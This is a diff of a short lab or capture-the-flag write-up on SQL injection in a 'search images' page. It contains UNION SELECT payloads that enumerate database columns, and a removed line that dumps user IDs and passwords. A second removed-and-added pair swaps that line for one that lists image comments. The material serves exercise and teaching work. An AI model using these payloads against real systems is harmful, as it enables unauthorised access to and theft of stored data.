@@ -1,4 +1,4 @@
-# SQL injection (search iamges page)
+# SQL injection (search images page)
 
 To exploit, go to the `http://$IPADDR/?page=searchimg` and write the following commands at the search field:
 
@@ -12,9 +12,9 @@ List all table columns and related table names:
 1 union select column_name, table_name from information_schema.columns
 ```
 
-List all users with encrypted passwords:
+List all comments from list_images table:
 ```
-1 union select 1, concat(user_id, char(124), countersign, char(124), Commentaire) from Member_Sql_Injection.users
+1 union select id, comment from Member_images.list_images
 ```
 
 ## References
